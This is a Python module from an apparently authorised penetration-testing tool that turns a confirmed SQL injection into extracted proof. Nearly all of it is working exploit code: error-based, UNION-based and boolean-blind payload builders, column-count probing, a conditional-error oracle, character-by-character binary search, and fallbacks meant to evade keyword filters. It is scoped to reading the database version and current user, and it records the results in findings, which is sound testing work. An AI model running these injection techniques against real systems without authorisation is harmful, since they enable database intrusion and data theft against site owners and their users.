"""Native SQL-injection value extraction — turn a confirmed SQLi into concrete proof.

Once SQLi is CONFIRMED on a parameter, a real tester proves impact by reading one value
out of the database. owlforge does this deterministically — no model, and no dependence
on sqlmap being installed or finishing — with an error-based → UNION-based → boolean-blind
ladder that extracts a single low-sensitivity value (the DBMS banner + current user). It
is read-only by construction: it only ever reads `version()`/`current_user`, never
application tables, never a write.

Bounded: a handful of requests for the error/UNION paths, a capped binary search for the
blind path. Pure stdlib + the sandbox HTTP client; deterministic signals only. The point
is harness depth — the machine proves impact so the report says "PostgreSQL 14.3 /
app_user", not merely "possible SQL injection".
"""

from __future__ import annotations

import re
from collections.abc import Callable

from owlforge.engine.preprobe import _send

_W = "owlX7z"   # delimiter we search for in the response — EVALUATED output only (see _delim)
_MAXLEN = 48    # cap on the blind-extracted string length (keeps the binary search bounded)
# tokens that mean "this is our payload reflected back, not the DB's answer" — reject them
_ECHO = ("||", "chr(", "char(", "concat(", "current_user", "current_database",
         "@@version", "system_user", "select ", "&apos;", "&#39;", "'")


def _delim(dialect: str) -> str:
    """Build the delimiter from chr()/char() so the LITERAL payload never contains the
    delimiter string `_W` — only the DB *evaluating* it produces `_W`. Without this, an app
    that reflects the input parameter (ginandjuice echoes `category`) makes the raw payload
    match our wrapper and we extract our own payload text instead of the database's answer."""
    codes = [ord(c) for c in _W]
    if dialect == "mysql":
        return "char(" + ",".join(str(c) for c in codes) + ")"
    if dialect == "mssql":
        return "+".join(f"char({c})" for c in codes)
    return "||".join(f"chr({c})" for c in codes)   # postgresql / oracle


def _wrap(dialect: str, inner: str) -> str:
    d = _delim(dialect)
    if dialect == "mysql":
        return f"concat({d},{inner},{d})"
    if dialect == "mssql":
        return f"{d}+{inner}+{d}"
    return f"{d}||{inner}||{d}"


def _clean(val: str | None) -> str | None:
    """Reject an 'extracted' string that is really our payload reflected back."""
    if not val or len(val) < 3:
        return None
    low = val.lower()
    return None if any(tok in low for tok in _ECHO) else val

# Read-only, low-sensitivity values to extract, best-first. We try several because a target
# may FILTER a keyword (ginandjuice strips "version"/"database", leaving malformed SQL) or run
# a dialect where one is absent — whichever the target actually accepts yields the proof.
# `current_user` has no parens/filtered-words and survives most naive blocklists.
_VALUE_EXPRS = [
    ("version", "version()"),
    ("current_user", "current_user"),
    ("session_user", "session_user"),
    ("current_db", "current_database()"),
    ("mssql_version", "@@version"),
    ("mssql_user", "system_user"),
    ("oracle_banner", "(select banner from v$version where rownum=1)"),
]

# (dialect, inner read-only value expr), best-first. version() first; current_user is the
# filter-resilient fallback (no parens / filtered keywords).
_DIALECT_INNERS = [
    ("postgresql", "version()||chr(47)||current_user"),
    ("postgresql", "current_user"),
    ("mysql", "concat(version(),0x2f,current_user())"),
    ("mysql", "current_user()"),
    ("mssql", "@@version+char(47)+system_user"),
    ("mssql", "system_user"),
    ("oracle", "(select banner from v$version where rownum=1)"),
]
# Per-dialect "force the value into a type-conversion error" wrapper.
_ERR = {
    "postgresql": lambda v: f"cast(({v}) as int)",
    "mssql": lambda v: f"convert(int,({v}))",
    "mysql": lambda v: f"extractvalue(1,{v})",
    "oracle": lambda v: f"to_number(({v}))",
}


def _resp(sandbox, t: dict, payload: str, headers) -> tuple[int, str]:
    r = _send(sandbox, t["method"], t["url"], t["param"], payload, headers) or {}
    return int(r.get("status") or 0), (r.get("body") or "")


def _find_wrapped(body: str, dialect: str) -> str | None:
    m = re.search(re.escape(_W) + r"(.*?)" + re.escape(_W), body, re.S)
    if m:
        return m.group(1).strip()
    if dialect == "mysql":   # XPATH error renders our 0x7e tilde then the value (truncated)
        m = re.search(r"~([ -~]{3,40})", body)
        if m:
            return m.group(1).strip().rstrip("'\"")
    return None


def _error_based(sandbox, t, and_pre, suf, headers) -> tuple[str | None, str]:
    for dialect, inner in _DIALECT_INNERS:
        wrapped = f"concat(0x7e,{inner})" if dialect == "mysql" else _wrap(dialect, inner)
        payload = f"{and_pre} AND {_ERR[dialect](wrapped)}{suf}"
        _st, body = _resp(sandbox, t, payload, headers)
        val = _clean(_find_wrapped(body, dialect))
        if val:
            return val, f"error-based/{dialect}"
    return None, ""


def _union_based(sandbox, t, union_pre, suf, headers) -> tuple[str | None, str]:
    # 1) find the column count with ALL-NULL columns (NULL is type-compatible with any
    #    column, so the correct count returns a non-error page while a wrong count errors).
    #    Injecting a string into every column instead would type-mismatch on numeric/date
    #    columns and just 500 — the historical reason UNION extraction failed on Postgres.
    ncols = None
    for n in range(1, 11):
        st, _ = _resp(sandbox, t, f"{union_pre} UNION SELECT {','.join(['NULL'] * n)}{suf}", headers)
        if st and st < 500:
            ncols = n
            break
    if not ncols:
        return None, ""
    # 2) drop a chr()-wrapped value into one column at a time until it echoes. Several value
    #    forms so a keyword filter (ginandjuice strips "version") or wrong dialect still yields
    #    one — current_user survives most naive blocklists. The chr() delimiter means a
    #    REFLECTED copy of the payload cannot match our wrapper; only EVALUATED output does.
    for col in range(ncols):
        for dialect, inner in _DIALECT_INNERS:
            slot = ["NULL"] * ncols
            slot[col] = _wrap(dialect, inner)
            _st, body = _resp(sandbox, t, f"{union_pre} UNION SELECT {','.join(slot)}{suf}", headers)
            val = _clean(_find_wrapped(body, ""))
            if val:
                return val, f"union-based ({ncols} cols, col {col + 1}, {dialect})"
    return None, ""


def _boolean_blind(sandbox, t, and_pre, suf, headers) -> tuple[str | None, str]:
    # Primary oracle: a CONDITIONAL ERROR — a false condition forces divide-by-zero, so the
    # response flips 200<->500 regardless of whether the injected value is a "valid" one.
    # Value-agnostic, and compared on STATUS ONLY: page bodies jitter by more than any fixed
    # length bucket between requests (dynamic markup), so a length-bucket oracle gives a
    # different signature for two genuinely-true responses and silently fails — the real
    # reason the first live ginandjuice extraction came back empty.
    def _cond(c: str) -> str:
        return f"{and_pre} AND 1/(case when ({c}) then 1 else 0 end)=1{suf}"

    t_st, _tb = _resp(sandbox, t, _cond("1=1"), headers)
    f_st, _fb = _resp(sandbox, t, _cond("1=2"), headers)
    if t_st and f_st and t_st != f_st:
        how = "boolean-blind (conditional error)"

        def truth(c: str) -> bool:
            return _resp(sandbox, t, _cond(c), headers)[0] == t_st
    else:
        # Fallback: a plain content-difference oracle (apps that show/hide rows, no error).
        tt_st, tt_b = _resp(sandbox, t, f"{and_pre} AND 1=1{suf}", headers)
        ff_st, ff_b = _resp(sandbox, t, f"{and_pre} AND 1=2{suf}", headers)
        how = "boolean-blind"
        if tt_st and ff_st and tt_st != ff_st:         # status distinguishes
            def truth(c: str) -> bool:
                return _resp(sandbox, t, f"{and_pre} AND {c}{suf}", headers)[0] == tt_st
        elif abs(len(tt_b) - len(ff_b)) > 50:          # length distinguishes (nearest-match)
            tl, fl = len(tt_b), len(ff_b)

            def truth(c: str) -> bool:
                n = len(_resp(sandbox, t, f"{and_pre} AND {c}{suf}", headers)[1])
                return abs(n - tl) <= abs(n - fl)
        else:
            return None, ""

    # Try each candidate value; extract the first the target actually accepts (not filtered,
    # not null). This is what makes it robust to keyword filters and dialect differences.
    for label, expr in _VALUE_EXPRS:
        # MSSQL has no length() (it is LEN); try both so extraction works across dialects
        lenfn = next((lf for lf in ("length", "len") if truth(f"{lf}(({expr}))>=1")), None)
        if lenfn is None:
            continue   # filtered out (malformed -> error) or null -> next candidate
        out = []
        for i in range(1, _MAXLEN + 1):
            if not truth(f"{lenfn}(({expr}))>={i}"):
                break
            lo, hi = 32, 126
            while lo < hi:
                mid = (lo + hi) // 2
                if truth(f"ascii(substring(({expr}),{i},1))>{mid}"):
                    lo = mid + 1
                else:
                    hi = mid
            out.append(chr(lo))
        val = "".join(out).strip()
        if len(val) >= 3:
            return val, f"{how} via {label}"
    return None, ""


def extract_one(sandbox, target: dict, headers=None) -> tuple[str | None, str]:
    """Run the extraction ladder on one confirmed-injectable target. Returns
    (value, technique) or (None, '')."""
    if sandbox is None:
        return None, ""
    t = {"url": target["url"], "param": target["param"],
         "method": (target.get("method") or "GET").upper()}
    contexts = (("1'", "-1'", "-- -"), ("1", "-1", "-- -"))   # string then numeric
    for and_pre, union_pre, suf in contexts:
        for fn, args in ((_error_based, (and_pre, suf)),
                         (_union_based, (union_pre, suf)),
                         (_boolean_blind, (and_pre, suf))):
            try:
                val, how = fn(sandbox, t, *args, headers)
            except Exception:
                val, how = None, ""
            if val:
                return val[:200], how
    return None, ""


def _sqli_targets(assessment_id: str):
    """Confirmed/suspected SQLi findings that carry an injectable endpoint+param."""
    from sqlmodel import select

    from owlforge.store.db import session
    from owlforge.store.models import Finding
    out = []
    with session() as s:
        rows = s.exec(select(Finding).where(Finding.assessment_id == assessment_id)).all()
        for f in rows:
            title = (f.title or "").lower()
            if "sql injection" not in title and "sqli" not in title:
                continue
            if f.status not in ("validated", "candidate"):
                continue
            url = f.repro_url or f.endpoint
            params = dict(f.repro_params or {})
            param = next(iter(params), None)
            if url and param:
                out.append((f.id, {"url": url, "param": param,
                                   "method": f.repro_method or f.method or "GET"}))
    return out


def extract_sqli_values(assessment_id, sandbox, session_headers=None,
                        log: Callable[[str], None] = lambda m: None, cap: int = 3) -> int:
    """Enrich confirmed SQLi findings with a concrete extracted value (DBMS banner /
    current user), natively and fast. Returns the number of findings enriched."""
    if sandbox is None:
        return 0
    targets = _sqli_targets(assessment_id)[:cap]
    if not targets:
        return 0
    from owlforge.store.db import session
    from owlforge.store.models import Finding
    enriched = 0
    for fid, tgt in targets:
        val, how = extract_one(sandbox, tgt, session_headers)
        if not val:
            continue
        with session() as s:
            f = s.get(Finding, fid)
            if not f:
                continue
            f.status = "validated"
            f.confidence = "high"
            note = (f"Extracted a live value via {how} (read-only): {val}")
            f.technical_analysis = ((f.technical_analysis or "").rstrip()
                                    + f"\n\nProof of impact — {note}.")
            f.proof_of_concept = ((f.proof_of_concept or "").rstrip()
                                  + f"\nExtracted ({how}): {val}")
            f.evidence = ((f.evidence + "\n") if isinstance(f.evidence, str) and f.evidence
                          else "") + f"extracted ({how}): {val}"
            f.validation_note = ((f.validation_note or "") + " | value-extracted").strip(" |")
            s.add(f)
            s.commit()
        enriched += 1
        log(f"sqli-extract: {tgt['param']} -> {val}  ({how})")
    return enriched
